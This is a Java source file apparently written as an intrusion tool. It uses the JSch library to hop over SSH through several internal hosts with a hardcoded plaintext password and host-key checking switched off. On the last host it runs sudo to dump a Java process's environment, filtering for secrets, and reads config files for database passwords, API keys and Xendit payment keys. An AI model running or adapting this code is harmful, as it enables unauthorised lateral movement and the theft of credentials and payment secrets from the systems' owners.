import com.jcraft.jsch.*;
import java.io.*;
class DF9 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    // Venus - read env + find config files
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.141 'ps aux | grep java | grep -v grep | head -1 | awk \"{print \\$2}\" > /tmp/vpid;echo ---VENUS-JVM---;ps aux | grep java | grep -v grep | head -1 | head -c 500;echo;echo ---VENUS-ENV---;echo kutul0nc4t | sudo -S cat /proc/$(cat /tmp/vpid)/environ 2>&1 | tr \"\\0\" \"\\n\" | grep -iE \"VEN_ENC|ENC|db\\.|PASS|SECRET\";echo ---VENUS-PROGS---;ls /progs/ 2>/dev/null;echo ---VENUS-CONF---;find /progs/ -name \"config*.properties\" -maxdepth 8 2>/dev/null | head -5;cat /progs/venus/*/webapps/*/WEB-INF/classes/config*.properties 2>/dev/null | grep -iE \"xendit|xnd_|db\\.pass|api\\.key\" | head -10' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
